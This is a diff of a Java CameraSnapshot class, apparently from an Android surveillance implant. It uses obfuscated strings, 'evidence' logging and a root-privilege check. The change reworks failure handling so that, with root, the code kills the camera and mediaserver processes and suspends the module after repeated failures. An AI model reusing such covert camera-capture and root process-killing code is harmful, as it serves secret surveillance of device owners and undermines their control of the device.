@@ -143,9 +143,6 @@ public class CameraSnapshot {
 	public int getCamera_killed() {
 		return camera_killed;
 	}
-	public void setCamera_killed(int ck) {
-		camera_killed=ck;
-	}
 
 	public void clearKillreq() {
 		kill_camera_request = 0;
@@ -364,45 +361,47 @@ public class CameraSnapshot {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (snapshot), something wrong with camera? WTF kill it for nth" + camera_killed + "times");
 		}
-
-		if(!Status.haveRoot()){
-			camera_killed++;
-			return;
+		camera_killed++;
+		if(camera_killed>MAX_CAMERA_KILLS){
+			EvidenceBuilder.info(M.e("Too many failures for camera module, suspending it"));
 		}
-
-		String pid_cam = Utils.pidOf(M.e("camera"));
-		String pid_ms = Utils.pidOf(M.e("mediaserver"));
-		try {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (snapshot) try to kill " + pid_cam);
-			}
-			camera_killed++;
+		if(Status.haveRoot()){
+			String pid_cam = Utils.pidOf(M.e("camera"));
+			String pid_ms = Utils.pidOf(M.e("mediaserver"));
 			try {
-					multimediaKills_markup.writeMarkupSerializable(camera_killed);
-			}catch (Exception e){
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (killCameraServices), Exception saving markup");
+					Check.log(TAG + " (snapshot) try to kill " + pid_cam);
 				}
-			}
-			Execute.executeRoot("kill " + pid_cam);
-			if (kill_also_mediaserver) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (snapshot) try to kill also mediaserver " + pid_cam);
-				}
-				Execute.executeRoot("kill " + pid_ms);
-				kill_also_mediaserver = false;
-			}
-			//if(lastKill==-1 || (startedAt - lastKill) <= MIN_INTERVAL_FOR_INCREMENT) {
 
-			//}
-			lastKill = startedAt;
-		} catch (Exception ex) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (snapshot) Error: " + ex);
+				try {
+					multimediaKills_markup.writeMarkupSerializable(camera_killed);
+				} catch (Exception e) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (killCameraServices), Exception saving markup");
+					}
+				}
+
+				Execute.executeRoot("kill " + pid_cam);
+				if (kill_also_mediaserver) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (snapshot) try to kill also mediaserver " + pid_cam);
+					}
+					Execute.executeRoot("kill " + pid_ms);
+					kill_also_mediaserver = false;
+				}
+				//if(lastKill==-1 || (startedAt - lastKill) <= MIN_INTERVAL_FOR_INCREMENT) {
+
+				//}
+				lastKill = startedAt;
+			} catch (Exception ex) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (snapshot) Error: " + ex);
+				}
 			}
 		}
 
 	}
+
 
 	@TargetApi(Build.VERSION_CODES.GINGERBREAD)
 	private Camera openCamera(int requestFace) {
